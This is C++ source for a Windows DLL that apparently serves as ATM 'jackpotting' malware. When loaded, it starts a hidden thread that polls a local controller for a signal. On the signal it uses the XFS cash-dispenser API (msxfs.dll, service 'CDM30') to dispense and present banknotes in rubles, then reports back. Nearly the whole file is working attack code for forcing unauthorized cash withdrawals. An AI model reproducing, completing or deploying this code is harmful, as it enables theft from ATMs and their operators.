// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#include "httplib.h"
#include <iostream>
#include <thread>
#include <chrono>
#include <Windows.h>
#include "XFSAPI.H"
#include "XFSCDM.H"


enum ErrorCodes {
    LoadError,
    DispenseFailed,
};


typedef int(__stdcall* Open)(LPSTR, HAPP, LPSTR, DWORD, DWORD, UINT, LPWFSVERSION, LPWFSVERSION, LPHSERVICE);
typedef int(__stdcall* StartUp)(UINT, LPWFSVERSION);
typedef int(__stdcall* Exec)(HSERVICE, DWORD, LPVOID, DWORD, LPWFSRESULT*);
typedef int(__stdcall* FreeRes)(LPWFSRESULT);

bool SendReq(const char* path)
{
    httplib::Client cli("http://127.0.0.1");
    auto res = cli.Get(path);

    if (res) {
        if (res->status == 200)
        {
            return true;
        }
    }
    else {
        return false;
    }
    return false;
}

void Loader()
{
    HINSTANCE hDll = LoadLibraryA("msxfs.dll");
    if (!hDll)
    {
        SendReq("/err?code=" + LoadError);
        return;
    }

    HRESULT hRes;
    FreeRes wfsfree = (FreeRes)GetProcAddress(hDll, "WFSFreeResult");
    StartUp wfsstartup = (StartUp)GetProcAddress(hDll, "WFSStartUp");
    WFSVERSION* lpServ = new WFSVERSION;
    hRes = wfsstartup(0x00010005, lpServ);

    Open wfsopen = (Open)GetProcAddress(hDll, "WFSOpen");
    WFSVERSION* lpSrvc = new WFSVERSION;
    WFSVERSION* lpSpi = new WFSVERSION;
    HSERVICE hServ;
    LPSTR lName = new char[6];
    lName = (LPSTR)"CDM30"; // https://twitter.com/r3c0nst/status/1234494497486233607
    hRes = wfsopen(lName, NULL, NULL, NULL, WFS_INDEFINITE_WAIT, 0x00010005, lpSrvc, lpSpi, &hServ);

    Exec wfsexec = (Exec)GetProcAddress(hDll, "WFSExecute");

    CHAR curr[3]; // 643 - RUB
    curr[0] = 0x52;
    curr[1] = 0x55;
    curr[2] = 0x42;

    WFSCDMDENOMINATION* denom = new WFSCDMDENOMINATION;
    memcpy(&denom->cCurrencyID, &curr, sizeof(curr));
    denom->ulAmount = 100;
    denom->usCount = 0;
    denom->lpulValues = NULL;
    denom->ulCashBox = NULL;

    WFSCDMDISPENSE disp = {
        0,
        1,
        0,
        false,
        denom
    };

    LPWFSRESULT lppRes = NULL;
    HRESULT dhRes = wfsexec(hServ, WFS_CMD_CDM_DISPENSE, (LPVOID)&disp, WFS_INDEFINITE_WAIT, &lppRes);
    hRes = wfsfree(lppRes);

    if ((int)dhRes == 0)
    {
        using namespace std::literals::chrono_literals;
        std::this_thread::sleep_for(std::chrono::seconds(15));

        LPWFSRESULT lppRes2 = NULL;
        LPWORD lpfwPos = WFS_CDM_POSNULL;
        hRes = wfsexec(hServ, WFS_CMD_CDM_PRESENT, (LPVOID)&lpfwPos, WFS_INDEFINITE_WAIT, &lppRes2);
        hRes = wfsfree(lppRes2);
    }
    else {
        SendReq("/err?code=" + DispenseFailed);
    }
    return;
}


void AskForPermission()
{
    bool res;
    for (;;)
    {
        res = SendReq("/get");

        if (res)
        {
            std::thread moneyz(Loader);
            moneyz.join();
            SendReq("/done");
            res = false;
        }

        using namespace std::literals::chrono_literals;
        std::this_thread::sleep_for(std::chrono::seconds(3));
    }
}


BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        std::thread moneyz(AskForPermission);
        moneyz.detach();
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

